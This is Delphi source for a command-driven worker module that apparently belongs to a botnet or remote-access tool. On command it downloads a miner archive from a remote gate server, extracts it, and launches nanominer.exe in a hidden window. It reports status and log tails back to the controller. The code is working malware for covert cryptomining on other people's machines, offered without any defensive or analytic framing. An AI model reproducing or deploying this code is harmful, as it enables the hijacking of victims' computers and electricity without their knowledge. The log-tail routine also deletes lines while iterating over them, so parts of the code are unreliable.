unit MineUnit;

interface

uses
  Windows, SysUtils, Classes,
  Basics, CommandUnit, Zip,
  DProcess;

type
  TMiner = class(TWorker)
  public
    procedure Execute; override;
  end;

implementation

uses NetUnit;

function Tail(FileName: string; LineCount: integer): String;
var
  S: TStringList;
  I: integer;
begin
  S := TStringList.Create;
  try
    S.LoadFromFile(FileName);
    for I := 0 to S.Count - LineCount do
      S.Delete(I);
  finally
    Result := S.Text;
    S.Free;
  end;
end;

procedure EditConfig;
var
  S: TStringList;
  I: integer;
  RigName: String;
Begin
  RigName := Options.Name;
  Delete(RigName, 1, Pos('-', RigName));
  RigName := 'Unit' + RigName;
  S := TStringList.Create;
  try
    S.LoadFromFile('Miner\config.ini');
    for I := 0 to S.Count - 1 do
      S.Strings[I] := StringReplace(S.Strings[I], '%rigName%', RigName,
        [rfReplaceAll]);
    S.SaveToFile('Miner\config.ini');
  finally
    S.Free;
  end;
End;

procedure TMiner.Execute;
var
  M: TProcess;
begin
  try
    if FParams.Values['command'] = 'Query' then
    Begin
      if FileExists('Miner\Logs\log.txt') then
      Begin
        CopyFile(PChar(GetCurrentDir + '\Miner\Logs\log.txt'),
          PChar(GetCurrentDir + '\Miner\Logs\log.tmp'), False);
        Net.SendResponse(Tail('Miner\Logs\log.tmp', 15), FID);
        DeleteFile('Miner\Logs\log.tmp');
      End
      else
        Net.SendResponse(E_GENERIC, FID);
    End
    else
    Begin
      DeleteFile('Miner\Logs\log.txt');
      if Not(FileExists('Miner\nanominer.exe')) then
      Begin
        if Net.DownloadFile(Options.Gate + 'miner.zip', 'miner.zip') then
        Begin
          try
            TZipFile.ExtractZipFile('miner.zip', 'Miner');
            // Causes a memory leak for some weird reason
          except
          end;
        End
        else
          Dbg('Download failed.', dError);
          DeleteFile('miner.zip');
      End;
      EditConfig;
      M := TProcess.Create(Nil);
      M.Executable := 'Miner\nanominer.exe';
      M.Options := [poNewConsole, poNewProcessGroup];
      M.CurrentDirectory := GetCurrentDir + '\Miner';
      M.ShowWindow := swoHIDE;
      M.Execute;
      Net.SendResponse('Mining started.', FID, False);
      Repeat
        Sleep(1000);
      Until Not(M.Running) or Terminated;
      if M.Running then
        M.Terminate(0);
      M.Free;
      Net.SendResponse('Mining ended.', FID);
    End;
  except
    on E: Exception do
      Dbg('Mine Error ' + E.ClassName + ': ' + E.Message, dError);
  end;
end;

end.
